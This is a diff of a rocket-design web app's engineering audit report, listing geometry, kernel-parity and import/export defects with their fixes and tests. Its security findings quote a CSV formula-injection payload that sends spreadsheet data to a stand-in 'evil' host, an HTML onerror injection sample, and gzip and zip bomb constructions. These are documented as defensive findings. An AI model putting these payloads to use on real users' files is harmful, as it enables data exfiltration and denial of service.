@@ -1,377 +1,1184 @@
 # AUDIT - `web/` engineering audit
 
-<!-- cspell:ignore radiused followable unticking uncomputable misclick recentered outdatedness downscales misdescribes carta entrancy -->
+<!-- cspell:ignore retuned retunes SEMROC Rocketarium Maadcow basemap APPNOTE -->
 
-Date: 2026-10-09. Branch `dev` at 991c937 plus the working tree. Run per
-`docs/AUDIT_PROMPT.md`: parallel review agents over five slices (files and
-storage; state; components, split into canvas and the rest; tree, geometry and
-the flight and design services, with a second cross-check of the services;
-dead code and tooling). The previous report (2026-10-01) is closed and lives in
-git history; nothing it lists as fixed has regressed except where a finding
-says so.
+Date: 2026-10-13. Branch `dev` at e871ddb, clean working tree. Run per
+`docs/AUDIT_PROMPT.md` as a fresh audit: no finding was carried forward from
+the previous report, and no agent read it. Twelve parallel review agents:
+slice 1 split into 1a (importers), 1b (`.ork`, `.rkt` and `.CDX1` writers),
+1c (exports and the printed report) and 1d (storage, motors, materials and
+app services); slice 2; slice 3 split into 3a (canvas), 3b (sim, tools and
+report components) and 3c (design, config, common and layout components);
+slices 4, 4b, 5 and 6.
 
-Scope: the `web/` package. `web/src/engine/vendor/` is generated TeaVM output
-and was not audited. `engine-java/` has its own prompt and its own report.
+Scope: the `web/` package, its scripts and workflows, and the docs that
+describe them. `web/src/engine/vendor/` is generated TeaVM output and was not
+audited. `engine-java/` has its own prompt; its bridge was read where a slice
+needed it, and one defect here (C1) is in the bridge.
 
-**Status, 2026-10-09.** 176 findings: 5 HIGH, 48 MED, 123 LOW. All five HIGH
-findings are correctness defects in geometry that the app computes for itself
-before the kernel sees the design, and all five were re-read against the source
-and the Java kernel. One MED is a security finding (S1, a CSV formula injection
-the earlier S1 fix missed).
+Every HIGH finding and every security finding was confirmed against the
+source by the lead, not only by the agent: C1 by rerunning the kernel, S1 and
+S2 by reproducing them against the project's fflate 0.8.3. Every MED marked
+VERIFIED was read at the cited lines. REPORTED marks a finding whose code was
+read but whose consequence depends on something outside the repo.
 
-**Resolution, 2026-10-09.** Every finding is FIXED, each behavioral fix with a
-test that fails without it, except these:
+## Status
 
-- **NOT A DEFECT.** C8: the kernel mounts fin sets only on body tubes, which
-  have one radius end to end, so the transition and nose cone cases cannot
-  occur. C62: does not reproduce on React 19.3, where the effect runs once and
-  the request is not aborted. C70: desktop's gravity field has the same range
-  (`SimulationOptionsPanel`, minimum 0, no maximum). C44, first half: the
-  kernel's `NoseCone` extends `Transition`, so a nose cone does count toward a
-  pod's bounding radius; the second half (the parent radius added only for a
-  body tube parent) is fixed.
-- **PARTIAL.** C73: the forecast-hours action waits for a fresh run
-  when the result is outdated; the launch site is not stored with the result.
+**1 open defect: 1 HIGH (R1)**, plus the upkeep section. C33 to
+C45 and C47 were found after the first pass, by the two checks added the same day and
+by the change audits of those checks and of the fixes since
+(see "Checks added after this report").
+Fixed and not counted: C40 and C41, in the change that added the checks; the
+HIGH findings C1 (transition shoulders) and C43 (stage overrides); the
+security findings S1, S2 and S3; C24 (the weather key), fixed by the
+shared key field the Esri map key added; R2 (the catalog fallback); R3 (the curve order); A1 and A2
+(accessibility); C33, C3, C37, C42, C10, C9 and C6 (steps 2 and 4 of
+the order of attack); C2 and C44 (step 5); C34; C11 and C12 (step 6); C4 (step 7); C5, C8 and C36 (step 8); C7 (step 9); T1 to T4 (step 10); T5; and every LOW finding (step 13). Each entry names the test that pins it.
 
-**Found after the audit, all fixed, 2026-10-09.** Following up the parity gap
-on catalog part masses turned up defects in the reference data, which no slice
-of this audit covered; `docs/AUDIT_PROMPT.md` now has a slice for it (slice 6).
-The published `data` branch catalog, which the deployed app reads first, had no
-part digests and was weeks stale, because the scheduled workflow never ran the
-digest step. The catalog held only the community database, not the files
-desktop OpenRocket ships beside it (about 1,800 parts, rail buttons among
-them). Digests were matched on manufacturer and part number alone, so parts
-that share a part number could carry each other's. One file's material
-densities leaked into another file's parts. A stated part mass was ignored,
-and nose cones lost their stated wall and shoulder. Each refresh changed the
-catalog's hash with no data change. The motor catalog carried no motor digests
-at all, for the same reason as the parts, so a saved `.ork` left desktop
-OpenRocket to pick among motors that share a name, and both digest steps wrote
-indented JSON that more than doubled what browsers download. The fixes and their tests are in the
-CHANGELOG under Unreleased.
+- **HIGH R1:** the published parts catalog is built by an older pipeline than
+  the one on this branch.
+- **Files desktop reads differently:** lug and rail button spacing (C2),
+  angles over 180 degrees (C3), auto values in `.rkt` (C8), two `.CDX1`
+  mappings (C9, C10), shoulder walls (C33), `auto` line and cord lengths (C36),
+  `.rkt` lugs (C37) and `.rkt` mass overrides (C42).
+- **Lost work:** C11 and C12, both rare.
 
-Two tests now check the geometry findings mechanically, and both have no known
-failures left: `web/tests/services/design/geometryParity.kernel.test.ts`
-compares every automatic radius, bore, profile and fin tab limit over 200
-generated designs with the kernel's own (`getComponentGeometry` on the bridge),
-and `web/tests/tree/geometryFlags.test.ts` requires every shape reader to honor
-`flipped`, `filled` and `clipped`. The gates after the fixes: `verify:ci` with
-4,667 unit tests and 82.6% statement coverage, 232 e2e tests, parity 359 lines
-with the golden unchanged, validation floors 9/135 and 61/135, `extract:check`,
-and the update-flow harness.
+## Gates
 
-## How to read the verification tags
+Run locally at e871ddb, all with exit code 0:
 
-- **VERIFIED** means the cited lines were re-read and the claim confirmed
-  independently of the agent that raised it, against the Java under
-  `engine-java/src/java` for anything ported from the kernel.
-- **CONFIRMED BY REVIEWER** means the review agent read the lines and confirmed
-  the claim itself, with a failure scenario, but it was not re-read a second
-  time. These are strong leads.
-- **REPORTED** means the agent raised it as plausible without fully confirming
-  it. Treat these as leads, not facts.
-- Duplicates raised by more than one reviewer are merged into one entry. Line
-  numbers are as of 991c937 plus the working tree.
+| Gate | Result |
+| --- | --- |
+| `npm run verify` (web) | pass: format, spell, typecheck, lint, knip, dupes, build; 476 test files, 5921 tests |
+| `npm run audit` (web) | pass: coverage, samples, desktop opens every sample with no warning, helpers |
+| `npm run audit` (engine-java) | pass: all 5 checks |
+| `npx playwright test` (whole suite, no shard) | 476 passed |
 
-## Gate picture, measured
+`npm run knip` reports nothing and `npm run dupes` finds 0 clones in 464
+files. Every module under `web/src` is reachable from `index.html`,
+`main.tsx` or `simWorker.ts`. The 9 exports reached only by tests are the
+intentional seams `tests/srcExportReach.test.ts` already lists. The green
+gates do not cover T1 to T4, which are gaps in the gates themselves.
 
-`npm run verify:ci` on 2026-10-09 passes: format check, spell, the three
-typechecks, lint with zero warnings, knip and the production build, then 4,389
-unit tests in 359 files with 76.8% statement and 78.2% line coverage (the floor
-is 70%). The e2e suite, parity and validation were green at the last full run
-the same day and no code has changed since. Every finding below passes these
-gates, so each fix needs a new test that fails without it.
+## Checks added after this report
 
-## The HIGH findings, in short
+Most defects here are one kind: the app holding its own copy of something the
+kernel knows (a default, a clamp, an automatic rule) with nothing comparing
+the two. Two checks now compare them. Each keeps a `KNOWN` list checked both
+ways, citing the findings above, so fixing one fails the check until its entry
+is removed, and a new disagreement fails it at once.
 
-- **C1. A flipped nose cone is drawn, exported and sized as if it were not
-  flipped.** `flipped` is read on `.ork` import and written on export, and
-  `ComponentFactory` passes it to the kernel's `setFlipped`, but no app-side
-  geometry reader (`shapeProfile.outerProfile`, the schematic, the report
-  drawing, the printable solid, the automatic radius table) looks at it. The
-  kernel flies the flipped shape; every picture and printed part shows the
-  other one.
-- **C2. A filled nose cone, body tube or transition cannot be run.**
-  `badDimensions` requires `thickness`, and a filled part has no `thickness`
-  key. Checked directly: `badDimensions` on `{type: 'nosecone', filled: true}`
-  returns `[{field: 'thickness'}]`, so the run is blocked.
-- **C3. An automatic tube fin radius never updates once stored.**
-  `autoRadius.ts:82` passes the node with its stored `outerRadius` to
-  `tubeFinRadius`, which returns any positive stored value before computing
-  the automatic one. Resize the body and the tube fins keep the old size.
-- **C4. The automatic radius fallback is 12 mm, not 25 mm.** With nothing to
-  follow, the kernel's `BodyTube.getAutoOuterRadius` uses
-  `SymmetricComponent.DEFAULT_RADIUS` (0.025). The app uses
-  `KERNEL_DEFAULTS.bodytube.outerRadius` (0.012), which is the
-  `ComponentFactory` size for a new tube, and the test pins the wrong value.
-- **C5. The automatic neighbor rule differs from the kernel's.** The kernel's
-  `getPreviousSymmetricComponent` and `getNextSymmetricComponent` walk into the
-  adjacent stage, and the kernel skips an automatic neighbor only when that
-  neighbor is itself sizing from this part; otherwise it chains through it. The
-  app looks only at `siblings[index ± 1]` and skips every automatic neighbor.
-  The app's drawing and mass figures can disagree with what the kernel flies.
+- **`web/tests/engine/fieldReadback.kernel.test.ts`** (in `npm run verify`).
+  For every field the Design tab edits, the value the panel shows has to be the
+  value the kernel holds after the build. It builds each part type as the
+  editor creates it, with each key left out, at each end of the range the panel
+  allows, and on Auto, in a 100 mm airframe, and again from seeds that put
+  every field into a state where it applies (a fin tab, a cluster, each shape,
+  an altitude event); it fails if any field is never compared. Kernel values
+  come from a new
+  bridge call, `getComponentFields` (`engine-java/src/api/java/api/ComponentFields.java`),
+  which reads each part back through its own getters. The panel's limits and
+  shown values come from one module, `web/src/services/design/fieldRange.ts`,
+  which the panel and the test both use. It holds C39, each entry matching only the disagreement its finding describes.
+- **The `fields` step of `npm run audit`** (`web/scripts/check-desktop-fields.mjs`,
+  `npm run check:fields`). Opens every `.ork` and `.rkt` the samples step saves
+  in desktop 24.12, now including a design with every part type (overrides,
+  a non-default material, an airfoil fin set, a single and a clustered motor
+  tube, a tail cone), and requires each part to come back at the same place in
+  the tree, at the same depth, with what the app's kernel flies, through the
+  same `ComponentFields` compiled against the release, which adds overrides,
+  materials, the finish and fin planform area to the panel's fields. It holds
+  C38, and lists what RockSim cannot carry. Values a RockSim file restates
+  (angles in degrees, a pod by its distance from the axis, a tab from the
+  root's front, a packed part by either end) are compared as desktop reads
+  them; its other `.rkt` entries name what RockSim cannot carry and the desktop
+  handler that shows it. The `desktop` step keeps the same kind of list for
+  loader warnings, so a known finding no longer stops the audit before the
+  `fields` step runs.
+
+The fix rule and the change audit that go with them are in
+`docs/AUDIT_PROMPT.md` ("Fixes") and `docs/AUDIT_PROMPT_CHANGES.md`.
 
 ## 🔴 Security
 
-### Medium
+**S1. MED, FIXED | `.ork` gzip inflates fully before the cap is checked** | `web/src/services/files/ork/importUnpack.ts:39-55` | VERIFIED
+Resolution: `importUnpack` feeds every inflater its input in 1 KiB slices and
+counts the output of each before the next. DEFLATE expands at most about
+1032:1, so the cap stops the work within about 1 MiB of its limit. Slicing
+alone made a stream that takes in input without producing output (a gzip
+file name that never ends, bytes after a member's data) cost time that grows
+with the square of its length, since fflate copies the input it holds back on
+every push: 16 s for a 4 MiB file. So a stream is also refused, with
+`errors.file.archiveCorrupt`, once it has taken in 128 KiB with no output;
+a valid stream never holds back more than a stored block's 64 KiB. Any error
+fflate raises becomes that keyed message rather than raw English. A gzipped
+file may hold at most four gzip members (`MAX_GZIP_MEMBERS`; OpenRocket writes
+one): each member costs a fresh inflater however little it holds, and 64 MiB
+of one-byte members took 384 s with every byte cap far off. Pinned by
+`tests/services/files/archiveBombs.test.ts`, which counts the bytes fflate's
+inflaters deliver: against the reader from before the fix a 16 MiB gzip
+delivered all 16 MiB before the refusal, where the bound is the cap plus 2 MiB.
+The finding as reported:
+`gunzipCapped` pushes the whole input to fflate's `Gunzip` in one call, and
+fflate inflates everything buffered before it calls `ondata`. Reproduced: a
+65 KB gzip of 64 MiB of zeros arrives as a single 67,108,864-byte chunk before
+the counter runs. `openOrkFile` accepts up to 64 MiB of gzip, which can
+declare tens of GB, so a crafted file crashes the tab instead of showing
+`errors.file.archiveTooLarge`. The comment ("Streamed, so the count stops the
+inflation as soon as it passes the cap") is false, and the test in
+`web/tests/services/files/designFile.test.ts:147-151` passes because it checks
+only that the call throws, after inflating 65 MiB.
+Fix: push the input in 64 KiB slices so each chunk is bounded and the throw
+lands early. Make the test assert the largest chunk delivered.
 
-- **S1** (MED, VERIFIED) `web/src/services/exports/csvExport.ts:253`. `flightEventsCsv` writes `# Simulation: ${name}` raw. Only CR/LF are stripped: commas are not removed, the line is not quoted, and `neutralizeFormula` is not applied. A simulation name from a shared .ork (`<simulation><name>`) such as `x,=HYPERLINK("http://evil/?"&A1)` puts a second cell starting with `=`. Called from FlightEventsTable.tsx:104 with `simName`. *Why it matters:* This is the S1 formula-injection class. The S1 fix covered `text()` but missed this line, so a hostile shared design runs a formula when the events CSV is opened in Excel or Sheets. *Fix:* Remove the separator (as `flightDataCsv`'s `clean` does), or quote the whole comment cell and pass it through `neutralizeFormula`. Add a case to csvExport.test.ts.
-### Low
+**S2. MED, FIXED | `.ork` zip cap trusts the declared size** | `web/src/services/files/ork/importUnpack.ts:71-91` | VERIFIED
+Resolution: a zip is read with fflate's streaming `Unzip`, member by member from
+the local headers as Java's `ZipInputStream` reads it, through a sliced
+inflater, and the per-member and total caps count what each member inflates
+to; the declared sizes are no longer consulted, so a member that declares more
+than it holds opens, and central directory entries cannot alias one member.
+Members whose sizes follow their data (a data descriptor, as desktop's
+`ZipOutputStream` writes them) open, checked on a `jar`-built `.ork` and in
+`archiveBombs.test.ts`. Pinned by `archiveBombs.test.ts`: a member declaring
+1000 bytes and inflating to 16 MiB is refused within the bound and past the
+cap, so the counted path is the one taken (the reader from before the fix
+returned it without an error); a gzip header that never ends, a member
+that runs on past its data and a gzip file of a thousand members are refused
+at once; and stored members and the
+total are counted by what they hold.
+The finding as reported:
+The `filter` charges each member `max(size, originalSize)` from the central
+directory. fflate's `unzipSync` allocates `originalSize` and keeps decoding
+the whole compressed stream past it, dropping the writes. Reproduced: a zip of
+256 MiB of zeros with its declared size patched to 1000 passes the filter
+(`[261960, 1000]`) and decodes the full stream before returning 1000 bytes. A
+64 MiB file, or 256 entries pointing at one member, freezes the tab for
+minutes inside every cap `importLimits.ts` sets.
+Fix: list the directory with `filter: () => false`, then inflate each wanted
+member through the same chunked stream as S1, counting real output against
+`min(originalSize, MAX_ARCHIVE_ENTRY_BYTES)`. Or refuse a deflated member whose
+compressed size exceeds its declared size plus a margin.
 
-- **S2** (LOW, CONFIRMED BY REVIEWER) `web/src/components/layout/AboutDialog.tsx:147-152,242`. isContributors checks only that `url` is a string, then renders it as href with target=_blank. The data is an own-origin build artifact (and its cached copy), so a `javascript:` or data URL would render as a live link. *Why it matters:* Low exposure (first-party file), but it is the one href in the slice that takes fetched data without a scheme check. *Fix:* Require /^https:\/\//. |.
-- **S3** (LOW, CONFIRMED BY REVIEWER) `web/src/services/exports/flightPathExport.ts:1278-1290 (KML template) with escaperFor('kml') at 1466-1469`. The balloon HTML in `<description>` is pre-escaped once, and values such as rocketName and configuration are also escaped exactly once. After the viewer's single XML decode, a name like `<img src=x onerror=...>` from a shared .ork is live HTML in the balloon. The comment says "the balloon gets ... the name the user typed", but in practice it gets the name as markup. *Why it matters:* HTML injection into Google Earth balloons, which render HTML (Earth Pro runs scripts). Impact depends on the viewer. *Fix:* Escape values that go into the description twice (an HTML escape, then the XML escape), for example with a section-scoped escaper or a pre-escaped model field.
-- **S4** (LOW, CONFIRMED BY REVIEWER) `web/src/services/files/designFile.ts:51 / ork/importUnpack.ts:32,67 / rktImport.ts:879 / motorDb.ts:189`. The zip caps (64 MiB per entry) apply only to zipped .ork. Bare-XML .ork, .rkt, .eng and .rse are decoded and parsed at any size (no `file.size` check anywhere in src; grep `file.size|MAX_.*BYTES`). *Why it matters:* A multi-hundred-MB shared design or motor file freezes the tab during DOMParser or split, which the archive caps were added to prevent. *Fix:* Refuse an input over MAX_ARCHIVE_ENTRY_BYTES before decoding, on every path.
-- **S5** (LOW, CONFIRMED BY REVIEWER) `web/src/services/app/remoteData.ts:134-135`. When the declared content-length is over the cap, the code throws without `ctrl.abort()`. The `finally` only clears the timer. *Why it matters:* The refused body keeps downloading while the fallback base is tried. The S5 fix (`reader.cancel`) covers only the streamed path, and thrustcurve.ts:99 does abort in the same case. *Fix:* Call `ctrl.abort()` before throwing (and on the `res.json()` fallback path).
+**S3. LOW, FIXED | KML names are escaped once** | `web/src/services/exports/flightPathExport.ts:1318, 1353, 1361, 1381, 1397` | REPORTED
+Resolution: the KML escaper (`escaperFor('kml')`, used by the built-in template
+and by user templates named `.kml`) leaves `<` and `>` out of every value
+before it escapes it, so no name can decode to markup in a viewer that sets it
+into HTML; text inside a balloon is HTML-escaped first and keeps every
+character. Pinned by `tests/services/exports/flightPathExport.test.ts` ("gives
+no name in KML a way to become markup") and the escaper tests, which fail
+against the writer from before the fix.
+The finding as reported:
+Descriptions go through `{{#htmlBalloon}}` and are escaped twice, but every
+`<name>` (rocket, simulation, stage, recovery device) is XML-escaped once.
+Google Earth's default balloon substitutes `$[name]` into HTML. Whether it
+escapes that substitution is not confirmed. Fix: confirm it; if names render
+as HTML, give the document a `BalloonStyle` that does not use `$[name]`.
 
 ## 🟡 Correctness
 
-### High
+**C1. HIGH, FIXED | Transition shoulders clamp to 25 mm when the ends are automatic** | `engine-java/src/api/java/api/ComponentFactory.java:221-249` | VERIFIED (kernel run)
+Resolution: `ComponentFactory.create` sets every stated shoulder radius with
+clamping off, as desktop's `.ork` loader does (`DocumentConfig`,
+"Transition:foreshoulderradius" and "Transition:aftshoulderradius", the nose
+cone's included), so a shoulder no longer reads an automatic end before the
+end has anything to follow. A nose cone is flipped before its shoulder is set,
+because `NoseCone.setFlipped` carries a shoulder to the other end through the
+clamping setter, and its shoulder goes through `NoseCone.setShoulder*`, which
+follow the base. Desktop makes two exceptions, and the app now makes them too:
+a flipped nose cone's shoulder is at most its resolved base (desktop reads
+`<isflipped>` last, and `setFlipped` carries the shoulder through the clamping
+setter), which `ComponentFactory.settleFlippedShoulders` applies once the base
+has resolved; and a `.rkt` shoulder is at most its end (the RockSim
+`NoseConeHandler` and `TransitionHandler` clamp), which `rktImport` applies as
+it reads the file. The transition below now weighs 73.67 g with automatic ends
+as with explicit ones, and a flipped nose cone with an automatic base keeps a
+stated shoulder that fits its base (it flew 12 mm before). Pinned by
+`fieldReadback.kernel.test.ts` (its C1 entries are gone; against the engine
+from before the fix it fails on every transition shoulder, 48 and 38 mm
+stated, 25 mm flown), by `tests/engine/statedShoulders.kernel.test.ts` (a nose
+cone and a flipped nose cone with automatic bases, both failing before the
+fix, and a transition end below 25 mm keeping a wider stated shoulder, as
+desktop's loader does, and the two flipped-cone clamps above, at the
+values desktop opens: 25 mm and 20 mm for 30 and 24 mm stated), by
+`tests/services/files/rktImport.test.ts` (a nose cone and a transition
+shoulder wider than their ends, which fail against the importer from before
+the fix), and by the `fields` step of `npm run audit`, whose every-part
+sample now has a tail cone with a shoulder wider than its base.
+The finding as reported:
+`create()` sets `setForeRadiusAutomatic(true)` and then
+`setForeShoulderRadius`, before `attachChildren` calls `parent.addChild`
+(`ComponentFactory.java:903-904`). With no parent,
+`getPreviousSymmetricComponent()` is null (`SymmetricComponent.java:611-614`),
+so the automatic radius reads `DEFAULT_RADIUS` 0.025
+(`SymmetricComponent.java:24`). `setForeShoulderRadius(r)` clamps with
+`min(r, getForeRadius())` and clamps the shoulder wall with it
+(`Transition.java:446-457`); the aft side does the same. Nothing re-applies
+the shoulders after attach: `applyWallThickness` covers tube couplers, engine
+blocks and tube fins only.
+Rerun by the lead: a conical transition 50 to 40 mm with 48 and 38 mm shoulders
+50 mm long weighs 73.67 g with explicit ends and 58.29 g with
+`foreRadiusAuto`/`aftRadiusAuto`. `getComponentGeometry` reports the same
+resolved profile for both. Every new transition is automatic at both ends
+(`treeEdit.ts:738-751`), and HPR `.ork` files use `auto` radii, so mass, CG,
+inertia and stability are wrong on any airframe wider than 50 mm.
+Fix: apply transition shoulder radius and wall in `applyWallThickness` (or a
+settle step after the build, as `settleFinTabs` does). Add automatic ends
+wider than 25 mm with shoulders to `fieldCoverage.kernel.test.ts` (its BASE
+uses explicit 20 mm ends) and add shoulders to what
+`geometryParity.kernel.test.ts` compares.
 
-- **C1** (HIGH, VERIFIED) `web/src/tree/shapeProfile.ts:271-283 (also shapeProfile.outerProfile callers: tree/schematicGeometry.ts:127, services/report/reportGeometry.ts:205-208, services/exports/solidMesh.ts:454-463, services/design/autoRadius.ts:31)`. A flipped nose cone (tail cone) is drawn, meshed, printed and auto-radiused nose-first. The editor offers `flipped` (componentFields.ts:340, "Flipped (tail cone)"), and ComponentFactory "nosecone" calls `nose.setFlipped(...)`. NoseCone.setFlipped moves the aft radius and shoulder to the fore end, so the kernel flies a part whose base faces forward. A grep of all of web/src for `flipped` finds only the .ork import reader and export writer. No geometry reader honors it: stationRadius, schematic profilePath, reportGeometry walkChain and the solidMesh nosecone case all use foreR=0 and aftR=aftRadius with the shoulder aft. autoRadius treats only the nose cone's aft end as followable. *Why it matters:* Ticking Flipped changes the flight, but the 2D/3D drawing, PDF side view and template, and the STL/OBJ export all show and print the cone the wrong way round. The tube ahead of it also auto-follows the wrong end. *Fix:* Add one helper (e.g. `noseConeRadii(node)` → {foreR, aftR, shoulderAtFore}) mirroring NoseCone.getBaseRadius/getShoulderLength. Route every profile reader and autoRadius through it. Add a test that builds a flipped cone through the engine and compares radii. |.
-- **C2** (HIGH, VERIFIED) `web/src/services/design/requiredComponent.ts:25-27`. `badDimensions` requires `thickness` on nosecone, bodytube and transition. A filled part has no `thickness` key: `ork/importReaders.ts:53-58` sets only `filled: true` for `<thickness>filled</thickness>`, and `rktImport.ts:268-271` does the same for ConstructionType 0. `designBlocker` (runnability.ts:118) and `computeStaticInfo` (buildRocket.ts:110) therefore report "thickness" as a bad dimension. *Why it matters:* A desktop .ork or .rkt with a solid nose cone (common on kits) cannot be run. The panel hides the thickness row while `filled` is on (DimensionFields.tsx:60), so the only way out is to turn Filled off. The bridge flies the part fine (ComponentFactory sets thickness 0.002 and setFilled). *Fix:* In `badDimensions`, skip `thickness` when `n.filled === true`, and add a requiredComponent test for an imported filled nose cone. |.
-- **C3** (HIGH, VERIFIED) `web/src/services/design/autoRadius.ts:82 (with web/src/tree/tubefins.ts:16-17)`. An automatic tube fin radius never updates once a number is stored. `parentDerived` passes the node with its stored `outerRadius` to `tubeFinRadius`, which returns any explicit `outerRadius > 0` before it computes anything. Every tube fin set already carries a number: `defaultNode` writes 0.012, and the first sync writes one on import. So ticking the Auto checkbox (DimensionFields.tsx:283 only sets the flag) changes nothing in the app. Changing the body diameter or the fin count leaves the radius stale too. Meanwhile the bridge (ComponentFactory.java:763) calls `setOuterRadiusAutomatic(true)`, and the kernel flies `TubeFinSet.getOuterRadius()` = getTouchingRadius() (getBodyRadius() when fewer than 3 fins). *Why it matters:* Example: 6 tube fins on a 26 mm body with Auto ticked. The kernel flies 26 mm tubes; the schematic, 3D view, mesh and report show 12 mm. The checkbox looks live but does nothing on screen, which is an inert control. *Fix:* Pass `{ ...node, outerRadius: undefined }` to `tubeFinRadius` the way the disc branch does. Replace the test's `>0 && <0.026` bounds (autoRadius.test.ts:212-226) with the closed form, and add a test that changes the body radius and expects the tube fins to follow.
-- **C4** (HIGH, VERIFIED) `web/src/services/design/autoRadius.ts:136 (and tests/services/design/autoRadius.test.ts:86-96)`. When nothing can be followed, the app falls back to `KERNEL_DEFAULTS.bodytube.outerRadius` (0.012, ComponentFactory's explicit-radius default). The kernel's automatic fallback is `SymmetricComponent.DEFAULT_RADIUS` = 0.025 (BodyTube.getAutoOuterRadius:108-109, Transition.getAutoForeRadius/getAutoAftRadius:91/202). The test "will not follow a neighbor that is itself automatic" pins the wrong number, which is a test checking a TS copy instead of the Java. *Why it matters:* The bridge sends the auto flag, so the kernel computes its own radius. Example: a lone automatic body tube, or two automatic tubes with no fixed neighbor. The kernel flies 25 mm; the app draws, meshes, cuts and reports 12 mm. CG, CP and mass come from the 25 mm rocket while the drawing shows another. *Fix:* Use 0.025 (add a `KERNEL_AUTO_RADIUS` constant citing SymmetricComponent.DEFAULT_RADIUS) and fix the test to expect it.
-- **C5** (HIGH, VERIFIED) `web/src/services/design/autoRadius.ts:47 and :133-136`. The neighbor rule does not match the kernel's in three ways. (a) An automatic body tube is never followed (`facingRadius` returns null). The kernel skips a neighbor only when that neighbor's own auto reference points back at us (`usesNextCompAutomatic` = auto && refComp == next). Otherwise it chains: `BodyTube.getFrontAutoRadius` recurses to the previous component (BodyTube.java:216-241). (b) Neighbors are read from the parent's children only. `getPreviousSymmetricComponent` / `getNextSymmetricComponent` walk into the previous or next stage (SymmetricComponent.java:611-661, 733-782). (c) A transition's automatic fore end looks only behind, and its aft end only ahead; with no neighbor there the kernel uses DEFAULT_RADIUS (Transition.java:86-93, 197-204). The TS falls back to the other side. *Why it matters:* Desktop's `BodyTube()` constructor is automatic and `Transition()` is automatic on both ends, so desktop-written .ork files are full of these. Nose (fixed) then auto tube then auto tube: the kernel flies the second tube at nose radius; the app draws it at the fallback. In a desktop two-stage file, the booster's first auto tube follows the sustainer in the kernel but falls to the fallback in the app. A tail transition with an automatic aft end flies 25 mm aft but is drawn straight. The drawing, DXF, mesh and report all disagree with the kernel. *Fix:* Port getPrevious/NextSymmetricComponent across stage boundaries, the usesNext/PreviousCompAutomatic skip, the recursive getFront/RearAutoRadius, and the one-sided transition rule. Add a `*.kernel.test.ts` that builds these chains through the real engine and compares radii.
-### Medium
+**C2. MED, FIXED | Lug and rail button spacing: the app and the `.ork` say 0, the kernel flies 60 and 58 mm** | `web/src/tree/placement.ts:28`, `web/src/services/files/ork/exportWriters.ts:43-46`, `web/src/services/files/ork/importTags.ts:178` | VERIFIED
+Resolution: `KERNEL_DEFAULTS` carries the constructor spacing of a lug (0.06 m)
+and a rail button (0.0582 m), and the panel (`absentValue`), the drawing
+(`lineInstances`, through `defaultSeparation`) and the `.ork` writer read it
+for a node that states none; the importer keeps a stated spacing, 0 included.
+Pinned by `kernelDefaults.kernel.test.ts` (each row read back from the kernel),
+`tests/engine/lineInstances.kernel.test.ts` (copies are drawn the kernel's
+spacing apart; fails against the code from before), `orkFieldRoundTrip.test.ts`
+(stacked lugs stay stacked), the read-back test and the `fields` step, whose
+C2 entries are gone. RockSim has no spacing element, so a `.rkt` lug opens in
+desktop at the constructor spacing; the check lists that as a format limit.
+The finding as reported:
+The bridge sets `instanceSeparation` only when the key is present
+(`ComponentFactory.java:736-739`). Without it the kernel keeps the
+constructor's value: `length * 2` = 0.06 m for a lug (`LaunchLug.java:38`),
+`outerDiameter * 6` = 0.0582 m for a rail button (`RailButton.java:66`). New
+lugs and buttons carry no key (`treeEdit.ts:865-873, 922-934`). So a user who
+sets Instance count to 2:
+- flies the second copy 58 or 60 mm aft;
+- sees both copies drawn on top of each other in 2D, 3D and aft views
+  (`lineInstances` defaults to 0);
+- saves `<instanceseparation>0</instanceseparation>`, which desktop flies
+  stacked.
+The importer drops a stated 0 (`if (sep !== 0)`), so a desktop file with
+stacked lugs comes back 60 mm apart.
+Fix: add `instanceSeparation` to `KERNEL_DEFAULTS` for launchlug and railbutton
+(checked by the `kernelDefaults.kernel.test.ts` pattern), seed it in
+`defaultNode`, read it in `lineInstances`, the panel and `instancesXml`, and
+keep a stated 0 on import.
 
-- **C6** (MED, CONFIRMED BY REVIEWER) `web/src/components/canvas/TreeSchematic.tsx:243-253 (also AftView.tsx:411,421-425)`. `onRoll` is always passed (CenterCanvas.tsx:107,117 are the only call sites), so every background drag rolls the fins and the pan branch (lines 250-253; AftView 426-429) can never run. Both views still show `cursor: 'grab'` once zoomed (TreeSchematic:402, AftView:411) *Why it matters:* After a wheel zoom near the nose you cannot drag over to the fins. The grab cursor promises a pan, and the drag spins the roll instead. The only way back is zoom out or Fit *Fix:* Pan when zoomed (or with a modifier key, or vertical drag), or drop the grab cursor and the dead pan branch |.
-- **C7** (MED, CONFIRMED BY REVIEWER) `web/src/components/canvas/AeroAnalysis.tsx:266-270`. The altitude box shows `Math.round(altitudeM * factor)` but stores the typed value unrounded (`v / factor`). With km or mi selected (prefs/units.ts distance list), typing 1.5 km sweeps at 1500 m while the box reads "2". With mi, `step` = Math.round(500*0.000621) = 0, an invalid step *Why it matters:* The figure on screen is not the altitude the sweep and tables were computed at *Fix:* Display with fractional digits for coarse units (or round the stored value the same way) and floor step at a positive value |.
-- **C8** (MED, CONFIRMED BY REVIEWER) `web/src/tree/finPlanform.ts:293-306 (symmetricRadius, used by parentRadiusOf → finTabSpan clamp; reached by rocketPrintExport)`. The tab-height clamp uses the wrong parent radius. For a transition it takes min(fore, aft) of the whole part; for a nose cone it takes the aft radius. The kernel (FinSet.getMaxTabHeight → getParentFrontRadius/getParentTrailingRadius) clamps to `sym.getRadius(finFront.x + tabFrontEdge)` and `sym.getRadius(finFront.x + tabTrailingEdge)`. That is the body radius at the tab's own two stations, applied once in ComponentFactory.applyFinTabs after addChild. *Why it matters:* On a boat tail with fins near its wide end, the exported tab is cut shallower than the kernel flies. On a nose-cone-mounted freeform fin the clamp uses the base radius where the body is thinner, so the printed tab can break through the wall. The two exports and the kernel disagree on the tab depth. *Fix:* Compute the fin front station (axialStart), then clamp to min(stationRadius(parent, front + x0), stationRadius(parent, front + x1)). Extend finPlanform.parentRadius.test.ts with a transition parent. |.
